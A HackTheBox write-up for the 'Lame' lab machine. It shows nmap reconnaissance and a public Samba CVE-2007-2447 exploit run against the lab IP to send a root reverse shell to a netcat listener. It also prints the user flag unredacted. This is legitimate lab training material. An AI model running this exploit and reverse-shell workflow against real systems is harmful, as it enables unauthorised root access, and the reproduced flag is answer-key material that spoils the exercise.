---
language: english
noteType: area
skills: "nmap, netcat"
status: draft
tags: [hackthebox, writeup]
title: Lame Write-Up
date: 06 Nov 2024
---

# Lame Write-Up

![Lame Overview](./lame-overview.png)

This HackTheBox machine is aimed to practice the following:

- nmap
- netcat

<!-- truncate -->

## Box Info

```
Machine      : Lame
OS           : Linux
Release date : 14, March 2017
IP address   : 10.129.143.253
Dificulty    : Easy
```

## Recon

### nmap

[[nmap]] finds four open TCP ports, FTP (21), SSH (22), old SMB (139), SMB (445):

```bash
nmap -p- --open --min-rate=5000 -Pn -T4 -oN nmap/open_ports 10.129.143.253
Starting Nmap 7.95 ( https://nmap.org ) at 2024-11-06 20:05 CET
Nmap scan report for 10.129.143.253
Host is up (0.048s latency).
Not shown: 65531 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 26.54 seconds
```

```bash
nmap -p 21,22,139,445 -sV -sC -oN nmap/services_version 10.129.143.253
Starting Nmap 7.95 ( https://nmap.org ) at 2024-11-06 20:16 CET
Nmap scan report for 10.129.143.253
Host is up (0.046s latency).

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 10.10.14.129
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey:
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
|_clock-skew: mean: 2h30m38s, deviation: 3h32m10s, median: 36s
| smb-os-discovery:
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name:
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2024-11-06T14:17:14-05:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 113.82 seconds
```

### SMB

Looing the samba version I found [this](https://github.com/amriunix/CVE-2007-2447). So following the Python script I did the following.

- Open my netcat and type:

```bash
nc -lvnp 1234
```

- Execute GitHub exploit to get the root shell:

```bash
python3 usermap_script.py 10.129.143.253 139 10.10.14.129 1234
[*] CVE-2007-2447 - Samba usermap script
[+] Connecting !
[+] Payload was sent - check netcat !
```

- Got shell:

```
nc -lvnp 1234
Connection from 10.129.143.253:41195
whoami
root
```

- Get the normal user and root flags:

```
ls home
ftp
makis
service
user
cd /home/makis
ls
user.txt
cat user.txt
f7da385424028604c99dd9ff8bb5a6b3
f7dXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
cd /root
ls
Desktop
reset_logs.sh
root.txt
vnc.log
cat root.txt
618XXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

And the machine is pwned! ;)

## References

- ch4p. (2017, March 14). <span class="reference-title">Lame</span>. _HTB Labs_. [https://app.hackthebox.com/machines/1](https://app.hackthebox.com/machines/1)
